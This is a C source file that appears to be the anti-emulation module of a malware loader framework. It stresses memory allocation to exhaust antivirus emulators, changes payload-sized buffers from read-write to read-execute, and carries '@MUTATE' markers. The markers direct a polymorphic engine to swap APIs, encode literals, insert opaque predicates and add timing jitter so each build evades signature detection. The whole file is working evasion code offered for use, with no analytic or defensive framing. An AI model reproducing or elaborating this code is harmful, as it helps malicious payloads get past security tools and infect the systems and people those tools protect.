/* MODULE: ANTIEMULATION
 * TYPE: sirallocalot
 * DESC: Memory allocation stress (exhausts emulator resources)
 * MUTATIONS: loop_mutation, api_swap, logic_mutation, timing_jitter
 */
#include "../header/definitions.h"

// @MUTATE:literal_encoding
#define SIR_ALLOC_COUNT 100
#define SIR_ITERATION_COUNT 5

void antiemulation() {
    void* allocs[SIR_ALLOC_COUNT];
    DWORD result;

    // @MUTATE:loop_mutation(fixed→GetTickCount_modulo)
    // @MUTATE:loop_restructuring(for→while|unroll)
    for(int i=0; i<SIR_ITERATION_COUNT; i++) {

        // @MUTATE:loop_restructuring(unroll)
        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            // @MUTATE:api_swap(VirtualAlloc→HeapAlloc|GlobalAlloc|LocalAlloc)
            // @MUTATE:api_wrapper_injection(VirtualAlloc)
            // @MUTATE:literal_encoding
            allocs[n] = VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);

            if (allocs[n]) {
                char *ptr = (char*)allocs[n];
                // @MUTATE:logic_mutation(memory_write→cpu_math)
                // @MUTATE:literal_encoding
                for(int k=0; k<PAYLOAD_LEN; k++) {
                    ptr[k] = 0x23;
                }
            }
        }

        // @MUTATE:timing_jitter(sleep_interval)

        // @MUTATE:loop_restructuring
        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            if (allocs[n]) {
                // @MUTATE:api_swap(VirtualProtect→alternative)
                // @MUTATE:opaque_predicate
                if (VirtualProtect(allocs[n], PAYLOAD_LEN, p_RX, &result) == 0) {
                    return;
                }
            }
        }

        // @MUTATE:loop_restructuring
        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            if (allocs[n]) {
                // @MUTATE:api_swap(VirtualFree→alternative)
                // @MUTATE:literal_encoding
                VirtualFree(allocs[n], 0, 0x8000);
            }
        }
    }
}
